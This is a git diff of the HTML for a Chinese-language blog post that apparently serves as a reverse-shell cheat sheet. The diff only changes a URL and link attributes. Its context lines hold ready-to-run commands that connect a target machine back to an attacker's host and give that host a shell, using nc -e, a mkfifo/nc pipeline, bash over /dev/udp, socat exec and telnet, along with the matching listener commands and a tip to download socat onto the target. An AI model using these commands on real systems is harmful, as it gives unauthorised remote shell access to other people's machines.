@@ -9,7 +9,7 @@
   <meta name="description" content="1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行） nc  《attack_ip》 《attack_port》 -e &#x2F;bin&#x2F;bash  1.1.2、没有-e参数（目标机器上执行） [1]&#x2F;bin&#x2F;sh | nc 《attack_ip》 《attack_port》 [2] rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Rerverse_shell&amp;Interactive_shell">
-<meta property="og:url" content="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/index.html">
+<meta property="og:url" content="https://twe1ve-web.github.io/2020/04/19/Rerverse-shell-Interactive-shell/index.html">
 <meta property="og:site_name" content="Twe1ve&#39;s Blog">
 <meta property="og:description" content="1、NC1.1、NC reverse shell1.1.1、-e参数（目标机器上执行） nc  《attack_ip》 《attack_port》 -e &#x2F;bin&#x2F;bash  1.1.2、没有-e参数（目标机器上执行） [1]&#x2F;bin&#x2F;sh | nc 《attack_ip》 《attack_port》 [2] rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -">
 <meta property="og:locale" content="en_US">
@@ -139,7 +139,7 @@ nc -lvvp attack_port   ###攻击机上执行</code></pre><h2 id="2-2、bash-udp"
 <pre><code>bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行
 nc -u -lvp 《aattack_port》  ####攻击机上执行</code></pre><p>同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
 <h1 id="3、Socat"><a href="#3、Socat" class="headerlink" title="3、Socat"></a>3、Socat</h1><pre><code>socat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
-socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行</code></pre><p>有些机器没有socat，需下载到目标机器：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
+socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行</code></pre><p>有些机器没有socat，需下载到目标机器：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" target="_blank" rel="noopener">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p>
 <h1 id="4、Telnet"><a href="#4、Telnet" class="headerlink" title="4、Telnet"></a>4、Telnet</h1><p>目标机器：</p>
 <pre><code>telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443</code></pre><p>攻击机：</p>
 <pre><code>nc -lv 80
